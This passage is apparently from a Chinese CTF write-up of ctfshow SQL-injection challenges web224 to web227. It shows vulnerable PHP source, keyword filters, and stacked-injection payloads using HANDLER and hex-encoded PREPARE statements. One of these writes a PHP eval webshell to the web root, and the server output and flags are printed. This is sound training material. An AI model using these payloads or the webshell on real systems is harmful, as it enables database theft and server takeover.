invoke__">select</span>(<span class="hljs-string">"admin"</span>,[<span class="hljs-string">"username"</span>,<span class="hljs-string">"password"</span>],[<span class="hljs-string">"username[=]"</span>=&gt;<span class="hljs-string">"<span class="hljs-subst">$user_name</span>"</span>]);<br>	<span class="hljs-variable">$result</span>=<span class="hljs-string">""</span>;<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>){<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$d</span>[<span class="hljs-string">'password'</span>]===<span class="hljs-variable">$user_password</span>){<br>				<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>]=<span class="hljs-string">"y"</span>;<br>				<span class="hljs-variable">$result</span>= <span class="hljs-string">"success"</span>;<br>		}<span class="hljs-keyword">else</span>{<br>				<span class="hljs-variable">$result</span>= <span class="hljs-string">"error"</span>;<br>			}<br>	}<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"error"</span>] &gt; <span class="hljs-number">0</span>)<br>	{<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">"Return Code: "</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"error"</span>] . <span class="hljs-string">"&lt;br /&gt;"</span>);<br>	}<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"size"</span>]&gt;<span class="hljs-number">10</span>*<span class="hljs-number">1024</span>){<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">"文件过大: "</span> .(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"size"</span>] / <span class="hljs-number">1024</span>) . <span class="hljs-string">" Kb&lt;br /&gt;"</span>);<br>	}<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">"upload/"</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]))<br>      {<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>] . <span class="hljs-string">" already exists. "</span>;<br>      }<br>    <span class="hljs-keyword">else</span><br>      {<br>	  <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>))).<span class="hljs-string">".zip"</span>;<br>      <span class="hljs-variable">$filetype</span> = (<span class="hljs-keyword">new</span> finfo)-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span>,<span class="hljs-variable">$filetype</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"file type error"</span>);<br>      }<br>	  <span class="hljs-variable">$filepath</span> = <span class="hljs-string">"upload/"</span>.<span class="hljs-variable">$filename</span>;<br>	  <span class="hljs-variable">$sql</span> = <span class="hljs-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">"','"</span>.<span class="hljs-variable">$filepath</span>.<span class="hljs-string">"','"</span>.<span class="hljs-variable">$filetype</span>.<span class="hljs-string">"');"</span>;<br>      <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],<br>      <span class="hljs-string">"upload/"</span> . <span class="hljs-variable">$filename</span>);<br>	  <span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">"localhost"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"ctf"</span>);<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)<br>		{<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">'Could not connect: '</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>		}<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>)) {<br>			<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"location:filelist.php"</span>);<br>		} <span class="hljs-keyword">else</span> {<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">"Error: "</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">"&lt;br&gt;"</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con</span>);<br>		}<br>		 <br>		<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br>		<br>      }<br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>

<p>堆叠注入</p>
<h3 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">dump</span>|<span class="hljs-params">union</span>|<span class="hljs-params">select</span>|<span class="hljs-params">update</span>|<span class="hljs-params">delete</span>|<span class="hljs-params">alter</span>|<span class="hljs-params">drop</span>|<span class="hljs-params">create</span>|<span class="hljs-params">describe</span>|<span class="hljs-params">set</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>',$<span class="hljs-params">username</span>)</span>){<br>    die(json<span class="hljs-constructor">_encode($<span class="hljs-params">ret</span>)</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure>

<p>测试发现<code>username=ctfshow';--%0a</code>可以正常回显。</p>
<p>注意到注入语句存在分号，尝试堆叠注入</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>';show%<span class="hljs-number">0</span>atables;--%<span class="hljs-number">0</span>a<br></code></pre></td></tr></tbody></table></figure>

<p>回显：</p>
<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">{"<span class="hljs-selector-tag">code</span>":<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{"id":<span class="hljs-string">"1"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"ctfshow"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"ctfshow"</span>},{"Tables_in_ctfshow_web":<span class="hljs-string">"ctfshow_flagasa"</span>},{"Tables_in_ctfshow_web":<span class="hljs-string">"ctfshow_user"</span>}]}<br></code></pre></td></tr></tbody></table></figure>

<p>猜测这里的ctfshow_flagasa表存在flag</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=ctfshow%<span class="hljs-number">27</span>;show%<span class="hljs-number">0</span>acolumns%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>actfshow_flagasa;--%<span class="hljs-number">0</span>a<br></code></pre></td></tr></tbody></table></figure>

<p>注意到有一个叫做flagas的字段：</p>
<figure class="highlight wren"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren">{<span class="hljs-string">"code"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2<span class="hljs-char escape_">\u6210</span>\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"1"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"ctfshow"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"ctfshow"</span>},{<span class="hljs-string">"Field"</span>:<span class="hljs-string">"id"</span>,<span class="hljs-string">"Type"</span>:<span class="hljs-string">"int(11)"</span>,<span class="hljs-string">"Null"</span>:<span class="hljs-string">"NO"</span>,<span class="hljs-string">"Key"</span>:<span class="hljs-string">"PRI"</span>,<span class="hljs-string">"Default"</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">"Extra"</span>:<span class="hljs-string">"auto_increment"</span>},{<span class="hljs-string">"Field"</span>:<span class="hljs-string">"flagas"</span>,<span class="hljs-string">"Type"</span>:<span class="hljs-string">"varchar(255)"</span>,<span class="hljs-string">"Null"</span>:<span class="hljs-string">"YES"</span>,<span class="hljs-string">"Key"</span>:<span class="hljs-string">""</span>,<span class="hljs-string">"Default"</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">"Extra"</span>:<span class="hljs-string">""</span>},{<span class="hljs-string">"Field"</span>:<span class="hljs-string">"info"</span>,<span class="hljs-string">"Type"</span>:<span class="hljs-string">"varchar(255)"</span>,<span class="hljs-string">"Null"</span>:<span class="hljs-string">"YES"</span>,<span class="hljs-string">"Key"</span>:<span class="hljs-string">""</span>,<span class="hljs-string">"Default"</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">"Extra"</span>:<span class="hljs-string">""</span>}]}<br></code></pre></td></tr></tbody></table></figure>

<p>因为过滤了set和select，使用handler来查数据：</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=ctfshow%<span class="hljs-number">27</span>;handler%<span class="hljs-number">0</span>actfshow_flagasa%<span class="hljs-number">0</span>aopen%<span class="hljs-number">0</span>aas%<span class="hljs-number">0</span>ap;handler%<span class="hljs-number">0</span>ap%<span class="hljs-number">0</span>aread%<span class="hljs-number">0</span>afirst;--%<span class="hljs-number">0</span>a<br></code></pre></td></tr></tbody></table></figure>

<p>结果：</p>
<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">{"<span class="hljs-selector-tag">code</span>":<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{"id":<span class="hljs-string">"1"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"ctfshow"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"ctfshow"</span>},{"id":<span class="hljs-string">"1"</span>,<span class="hljs-string">"flagas"</span>:<span class="hljs-string">"ctfshow{9dc954b5-0bba-41f8-ac9e-a44d3e85adfa}"</span>,<span class="hljs-string">"info"</span>:<span class="hljs-string">"you get it"</span>}]}<br></code></pre></td></tr></tbody></table></figure>

<h3 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">dump</span>|<span class="hljs-params">union</span>|<span class="hljs-params">select</span>|<span class="hljs-params">update</span>|<span class="hljs-params">delete</span>|<span class="hljs-params">alter</span>|<span class="hljs-params">drop</span>|<span class="hljs-params">create</span>|<span class="hljs-params">describe</span>|<span class="hljs-params">set</span>|<span class="hljs-params">show</span>|\(<span class="hljs-operator">/</span><span class="hljs-params">i</span>',$<span class="hljs-params">username</span>)</span>){<br>    die(json<span class="hljs-constructor">_encode($<span class="hljs-params">ret</span>)</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure>

<p>和225相比，增加了过滤show,以下语句回显正常</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=user1';--%0a<br>{<span class="hljs-string">"code"</span>:0,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:1,<span class="hljs-string">"data"</span>:[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"2"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"user1"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"111"</span>}]}<br></code></pre></td></tr></tbody></table></figure>

<h2 id="SQL预处理："><a href="#SQL预处理：" class="headerlink" title="SQL预处理："></a>SQL预处理：</h2><p>在SQL中，<code>PREPARE</code> 是一种用于创建预处理语句的命令。它允许在执行之前准备和编译一个SQL语句，并将其存储在数据库中供后续使用。</p>
<p><code>PREPARE</code> 命令的基本语法如下：</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">PREPARE</span> statement_name <span class="hljs-keyword">FROM</span> sql_statement;<br></code></pre></td></tr></tbody></table></figure>

<p>其中，<code>statement_name</code> 是为预处理语句指定的名称，<code>sql_statement</code> 是要准备和编译的SQL语句。</p>
<p>以下是使用 <code>PREPARE</code> 命令的示例：</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">PREPARE</span> stmt1 <span class="hljs-keyword">FROM</span> <span class="hljs-string">'SELECT * FROM customers WHERE age &gt; ? AND city = ?'</span>;<br></code></pre></td></tr></tbody></table></figure>

<p>在这个示例中，我们使用 <code>PREPARE</code> 命令创建了一个名为 <code>stmt1</code> 的预处理语句。该语句是一个查询语句，其中包含两个占位符 <code>?</code>，用于接收参数值。</p>
<p>一旦预处理语句被创建，我们可以使用 <code>EXECUTE</code> 命令来执行它，并传递参数值：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXECUTE</span> stmt1 <span class="hljs-keyword">USING</span> <span class="hljs-number">25</span>, <span class="hljs-string">'New York'</span>;<br></code></pre></td></tr></tbody></table></figure>

<p>在这个示例中，我们使用 <code>EXECUTE</code> 命令执行了名为 <code>stmt1</code> 的预处理语句，并传递了两个参数值：25 和 ‘New York’。数据库系统会使用预处理语句的编译版本执行查询，并返回结果。</p>
<p>PY:</p>
<p>这里使用concat来绕过select被过滤</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=user1';PREPARE flag <span class="hljs-keyword">from</span> concat(<span class="hljs-string">'s'</span>,<span class="hljs-string">'elect'</span>, <span class="hljs-string">' database()'</span>);EXECUTE flag;<br></code></pre></td></tr></tbody></table></figure>

<p>但又因为在此题<strong>括号被过滤</strong>了，我们直接使用<strong>16进制来绕过</strong></p>
<figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">user1';PREPARE+flag+from+0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">206374667368</span>5f6f775f666c<span class="hljs-number">61676173</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure>

<h3 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h3><p>同web226，先查表：</p>
<figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">username=user1';PREPARE+flag+<span class="hljs-keyword">from</span>+<span class="hljs-number">0x73686f77207461626c6573</span>;EXECUTE+flag;<span class="hljs-comment">--%0a</span><br><br>{<span class="hljs-string">"code"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"2"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"user1"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"111"</span>},{<span class="hljs-string">"Tables_in_ctfshow_web"</span>:<span class="hljs-string">"ctfshow_user"</span>}]}<br></code></pre></td></tr></tbody></table></figure>

<p>查数据：</p>
<figure class="highlight sqf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">发现ctfshow_user表没有<span class="hljs-built_in">flag</span>,尝试写webshell<br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">select '&lt;?php eval($_GET[1]);?&gt;' into outfile '/var/www/html/a.php'<br>username=user1';PREPARE+flag+from+0x<span class="hljs-number">7365</span>6c<span class="hljs-number">6563742027</span>3c3f<span class="hljs-number">70687020657661</span>6c<span class="hljs-number">2824</span>5f<span class="hljs-number">474554</span>5b315d293b3f3e<span class="hljs-number">272069</span>6e746f206f<span class="hljs-number">75746669</span>6c<span class="hljs-number">652027</span>2f<span class="hljs-number">766172</span>2f<span class="hljs-number">777777</span>2f<span class="hljs-number">6874</span>6d6c2f612e<span class="hljs-number">70687027</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure>

<p>访问a.php，发现文件写入成功，查看api/index.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-11-01 14:21:03</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-11-17 02:29:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">"config.php"</span>;<br><span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_USER_AGENT'</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/sqlmap/i'</span>, <span class="hljs-variable">$ua</span>)){<br>	<span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"使用sqlmap是没有灵魂的"</span>)));<br><br>}<br><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>)){<br>	<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpwd</span>,<span class="hljs-variable">$dbname</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){<br>	 	<span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>	}<br>	<span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"set name <span class="hljs-subst">$charName</span>"</span>);<br>	<span class="hljs-variable">$num</span> = <span class="hljs-number">1</span>;<br>	<span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br>		<span class="hljs-string">"code"</span>=&gt;<span class="hljs-number">0</span>,<br>		<span class="hljs-string">"msg"</span>=&gt;<span class="hljs-string">"查询失败"</span>,<br>		<span class="hljs-string">"count"</span>=&gt;<span class="hljs-variable">$num</span>,<br>		<span class="hljs-string">"data"</span>=&gt;<span class="hljs-keyword">array</span>()<br>	);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\,|db/i'</span>,<span class="hljs-variable">$id</span>)){<br>		<span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>	}<br><br>	<span class="hljs-variable">$sql</span> = <span class="hljs-string">"select id,username,pass from ctfshow_user where username = '<span class="hljs-subst">{$id}</span>';"</span>;<br><br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>))<br>	{<br>	    <span class="hljs-keyword">do</span><br>	    {<br>	        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_store_result</span>(<span class="hljs-variable">$conn</span>))<br>	        {<br>	            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_object</span>(<span class="hljs-variable">$result</span>))<br>	            {<br>	            	<span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'查询成功'</span>;<br>					<span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], <span class="hljs-variable">$row</span>);<br>	            }<br>	            <span class="hljs-title function_ invoke__">mysqli_free_result</span>(<span class="hljs-variable">$result</span>);<br>	        }<br>	    }<br>	    <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">mysqli_next_result</span>(<span class="hljs-variable">$conn</span>));<br>	}<br>	<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br><br><br>}<span class="hljs-keyword">else</span>{<br><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpwd</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){<br> 	<span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>}<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"set name <span class="hljs-subst">$charName</span>"</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select count(username) as num from ctfshow_user;"</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_object</span>()-&gt;num;<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br>	<span class="hljs-string">"code"</span>=&gt;<span class="hljs-number">0</span>,<br>	<span class="hljs-string">"msg"</span>=&gt;<span class="hljs-string">"查询失败"</span>,<br>	<span class="hljs-string">"count"</span>=&gt;<span class="hljs-variable">$num</span>,<br>	<span class="hljs-string">"data"</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><br><span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>]);<br><span class="hljs-variable">$limit</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'limit'</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|dump/i'</span>, <span class="hljs-variable">$limit</span>)){<br>	<span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from ctfshow_user limit "</span>.<span class="hljs-title function_ invoke__">intval</span>((<span class="hljs-variable">$page</span>-<span class="hljs-number">1</span>)*<span class="hljs-variable">$limit</span>).<span class="hljs-string">","</span>.<span class="hljs-variable">$limit</span>.<span class="hljs-string">";"</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_object</span>()){<br>	<span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'查询成功'</span>;<br>	